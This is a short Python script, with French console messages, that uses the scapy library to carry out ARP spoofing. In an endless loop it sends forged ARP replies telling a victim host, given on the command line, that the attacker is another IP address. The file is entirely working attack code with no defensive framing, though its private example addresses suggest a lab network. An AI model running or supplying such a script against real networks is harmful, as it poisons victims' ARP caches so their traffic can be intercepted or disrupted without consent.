from scapy.all import ARP, send
import sys

def arp_spoof(victim_ip, spoof_ip):
    packet = ARP(
        op=2,
        pdst=victim_ip,
        hwdst="08:00:27:ad:25:87",
        psrc=spoof_ip
    )
    
    print(f"ARP Spoofing : Se faire passer pour {spoof_ip} auprès de {victim_ip}")
    
    while True:
        send(packet, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python arp_spoof.py <victim_ip> <spoof_ip>")
        print("Exemple: python arp_spoof.py 10.2.1.52 10.2.1.100")
        sys.exit(1)

    victim_ip = sys.argv[1]
    spoof_ip = sys.argv[2]

    arp_spoof(victim_ip, spoof_ip)
